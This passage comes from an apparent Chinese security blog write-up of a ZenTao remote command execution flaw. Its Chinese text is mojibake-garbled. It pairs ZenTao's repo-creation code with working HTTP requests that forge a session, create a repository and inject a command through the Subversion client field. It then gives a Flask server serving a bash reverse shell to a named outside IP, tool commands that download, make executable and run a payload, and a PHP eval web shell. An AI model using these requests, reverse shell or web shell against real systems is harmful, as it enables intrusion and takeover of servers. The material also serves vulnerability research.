</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>encrypt</span> <span class=o>==</span> <span class=s1>&#39;base64&#39;</span><span class=p>)</span> <span class=nv>$data</span><span class=o>-&gt;</span><span class=na>password</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dao</span><span class=o>-&gt;</span><span class=na>insert</span><span class=p>(</span><span class=nx>TABLE_REPO</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$skip</span> <span class=o>=</span> <span class=s1>&#39;serviceToken&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>batchCheck</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>create</span><span class=o>-&gt;</span><span class=na>requiredFields</span><span class=p>,</span> <span class=s1>&#39;notempty&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>batchCheckIF</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>!=</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>,</span> <span class=s1>&#39;path,client&#39;</span><span class=p>,</span> <span class=s1>&#39;notempty&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>batchCheckIF</span><span class=p>(</span><span class=nv>$isPipelineServer</span><span class=p>,</span> <span class=s1>&#39;serviceHost,serviceProject&#39;</span><span class=p>,</span> <span class=s1>&#39;notempty&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>batchCheckIF</span><span class=p>(</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Subversion&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span><span class=o>-&gt;</span><span class=na>repo</span><span class=o>-&gt;</span><span class=na>svn</span><span class=o>-&gt;</span><span class=na>requiredFields</span><span class=p>,</span> <span class=s1>&#39;notempty&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>check</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>,</span> <span class=s1>&#39;unique&#39;</span><span class=p>,</span> <span class=s2>&#34;`SCM` = &#39;</span><span class=si>{</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>checkIF</span><span class=p>(</span><span class=nv>$isPipelineServer</span><span class=p>,</span> <span class=s1>&#39;serviceProject&#39;</span><span class=p>,</span> <span class=s1>&#39;unique&#39;</span><span class=p>,</span> <span class=s2>&#34;`SCM` = &#39;</span><span class=si>{</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span><span class=si>}</span><span class=s2>&#39; and `serviceHost` = &#39;</span><span class=si>{</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>serviceHost</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>checkIF</span><span class=p>(</span><span class=o>!</span><span class=nv>$isPipelineServer</span><span class=p>,</span> <span class=s1>&#39;path&#39;</span><span class=p>,</span> <span class=s1>&#39;unique&#39;</span><span class=p>,</span> <span class=s2>&#34;`SCM` = &#39;</span><span class=si>{</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>SCM</span><span class=si>}</span><span class=s2>&#39; and `serviceHost` = &#39;</span><span class=si>{</span><span class=nv>$data</span><span class=o>-&gt;</span><span class=na>serviceHost</span><span class=si>}</span><span class=s2>&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>autoCheck</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=o>-&gt;</span><span class=na>exec</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>dao</span><span class=o>::</span><span class=na>isError</span><span class=p>())</span> <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rmClientVersionFile</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$repoID</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dao</span><span class=o>-&gt;</span><span class=na>lastInsertID</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>post</span><span class=o>-&gt;</span><span class=na>SCM</span> <span class=o>==</span> <span class=s1>&#39;Gitlab&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=cm>/* Add webhook. */</span>
</span></span><span class=line><span class=cl>            <span class=nv>$repo</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>getRepoByID</span><span class=p>(</span><span class=nv>$repoID</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>loadModel</span><span class=p>(</span><span class=s1>&#39;gitlab&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>addPushWebhook</span><span class=p>(</span><span class=nv>$repo</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$repoID</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºä¸€ä¸ªrepoï¼Œå…·ä½“è§PoC</p><h1 id=ä¸‰poc>ä¸‰ã€PoC</h1><h2 id=31-ä¼ªé€ session>3.1 ä¼ªé€ session</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/misc-captcha-user</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>8.130.106.245:8080</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>HTTP_SEC_FETCH_DEST</span><span class=o>:</span> <span class=l>frame</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span><span class=l>http://8.130.106.245:8080/index.php?m=user&amp;f=login&amp;referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>2</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217023455.png loading=lazy alt=image></p><h2 id=32-åˆ›å»ºrepo>3.2 åˆ›å»ºrepo</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/repo-create.html</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>8.130.106.245:8080</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span><span class=l>http://8.130.106.245:8080/index.php?m=user&amp;f=login&amp;referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>zentaosid=898j16uh93p7kvvca97uget3fu; lang=zh-cn; device=desktop; theme=default</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>39</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SCM=Gitlab&amp;name=hacker1&amp;product=hacker1
</span></span></code></pre></td></tr></table></div></div><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217030510.png loading=lazy alt=image></p><h2 id=33-å‘½ä»¤æ‰§è¡Œ>3.3 å‘½ä»¤æ‰§è¡Œ</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/repo-edit-22</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>8.130.106.245:8080</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span><span class=l>http://8.130.106.245:8080/index.php?m=user&amp;f=login&amp;referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=</span>
</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>zentaosid=898j16uh93p7kvvca97uget3fu; lang=zh-cn; device=desktop; theme=default; windowWidth=1024; windowHeight=924</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>28</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SCM=Subversion&amp;client=&#39;pwd&#39;;
</span></span></code></pre></td></tr></table></div></div><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217030534.png loading=lazy alt=image></p><h1 id=å››exp>å››ã€EXP</h1><h2 id=40-å‰è¨€>4.0 å‰è¨€</h2><p>åœ¨PoCä¸­å‘ç°ï¼Œç›´æ¥åå¼¹shellå¹¶ä¸è¡Œï¼Œæ•…å°è¯•åˆ«çš„æ–¹æ¡ˆ</p><h2 id=41-getshell>4.1 getshell</h2><p>æ­å»ºflaskæœåŠ¡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>redirect</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>root</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;/bin/bash -i &gt;&amp; /dev/tcp/8.140.232.215/33113 0&gt;&amp;1&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033418.png loading=lazy alt=image></p><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033500.png loading=lazy alt=image></p><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033622.png loading=lazy alt=image></p><p>ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸‹å·¥å…·https://github.com/0xf4n9x/Zentao-Captcha-RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>cnvd</span><span class=o>-</span><span class=mi>2023</span><span class=o>-</span><span class=mf>02709.</span><span class=n>exe</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>8.130.106.245</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span> <span class=o>-</span><span class=n>c</span> <span class=s2>&#34;curl 8.140.232.215:80 -o /tmp/moxbbzz&#34;</span>
</span></span><span class=line><span class=cl><span class=n>cnvd</span><span class=o>-</span><span class=mi>2023</span><span class=o>-</span><span class=mf>02709.</span><span class=n>exe</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>8.130.106.245</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span> <span class=o>-</span><span class=n>c</span> <span class=s2>&#34;chmod +x /tmp/moxbbzz&#34;</span>
</span></span><span class=line><span class=cl><span class=n>cnvd</span><span class=o>-</span><span class=mi>2023</span><span class=o>-</span><span class=mf>02709.</span><span class=n>exe</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>8.130.106.245</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span> <span class=o>-</span><span class=n>c</span> <span class=s2>&#34;/bin/bash /tmp/moxbbzz&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=42-æ¤å…¥æœ¨é©¬>4.2 æ¤å…¥æœ¨é©¬</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span> <span class=o>&gt;</span> <span class=n>shell</span><span class=o>.</span><span class=n>php</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217033915.png loading=lazy alt=image></p><p><img src=https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20251217034606.png loading=lazy alt=image></p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>PHP</a>
<a href=/tags/%E7%A6%85%E9%81%93/>ç¦…é“</a></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>æœ€åæ›´æ–°äº Dec 19, 2025 15:00 +0800</span></section></footer></article><script src=https://utteranc.es/client.js repo=lantern-lab/lantern-lab.github.io issue-term=pathname crossorigin=anonymous async></script><style>.utterances{max-width:unset}</style><script>let utterancesLoaded=!1;function setUtterancesTheme(e){let t=document.querySelector(".utterances iframe");t&&t.contentWindow.postMessage({type:"set-theme",theme:`github-${e}`},"https://utteranc.es")}addEventListener("message",e=>{if(e.origin!=="https://utteranc.es")return;utterancesLoaded=!0,setUtterancesTheme(document.documentElement.dataset.scheme)}),window.addEventListener("onColorSchemeChange",e=>{if(!utterancesLoaded)return;setUtterancesTheme(e.detail)})</script><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 é­”ä»™æ£’æ£’ä¹‹ä¸»</section><section class=powerby>ä½¿ç”¨ <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> æ„å»º<br>ä¸»é¢˜ <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> ç”± <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> è®¾è®¡</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>